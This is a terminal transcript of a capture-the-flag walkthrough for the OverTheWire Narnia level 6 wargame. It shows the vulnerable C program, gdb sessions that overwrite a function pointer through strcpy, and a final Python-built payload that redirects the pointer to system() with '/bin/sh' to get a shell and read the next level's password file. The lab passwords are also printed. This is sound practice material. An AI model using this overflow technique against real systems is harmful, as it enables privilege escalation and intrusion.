Terminal  
===  
```  
ssh narnia6@narnia.labs.overthewire.org  
narnia6@narnia.labs.overthewire.org's password: neezocaeng <enter>  
narnia6@melinda:~$ cd /narnia
narnia6@melinda:/narnia$ cat narnia6.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>```  **<---- Contains system() function**
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	fp(b1);

	exit(1);
}  
narnia6@melinda:/narnia$ ./narnia6    
./narnia6 b1 b2
narnia6@melinda:/narnia$ ./narnia6 a b
a  
narnia6@melinda:/narnia$ ./narnia6 $(python -c'print "A"*8 + " " + "B"*8')
Segmentation fault  
narnia6@melinda:/narnia$ gdb -q ./narnia6
Reading symbols from ./narnia6...(no debugging symbols found)...done.
Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 + " " + "B"*8')

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()  
(gdb) r $(python -c'print "A"*8 + "BBBB" +  " " + "C"*8')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 + "BBBB" +  " " + "C"*8')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()  
(gdb) r $(python -c'print "A"*8 +  " " + "C"*8 + "AAAA"')  
Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 +  " " + "C"*8 + "AAAA"')

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()  
(gdb) r a b
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia6 a b

Breakpoint 1, 0x0804855d in main ()  
(gdb) break system  **<---- Put a breakpoint at the memory location of system()**  
Breakpoint 2 at 0xf7e62e70  
Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 +  "\x70\x2e\xe6\xf7" +  " " + "C"*8')

Breakpoint 1, 0x0804855d in main ()
(gdb) c
Continuing.

Breakpoint 2, 0xf7e62e70 in system () from /lib32/libc.so.6  
(gdb) quit
narnia6@melinda:/narnia$ ./narnia6 $(python -c'print "A"*8 +  "\x70\x2e\xe6\xf7" +  " " + "C"*8 + "/bin/sh"')
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu  



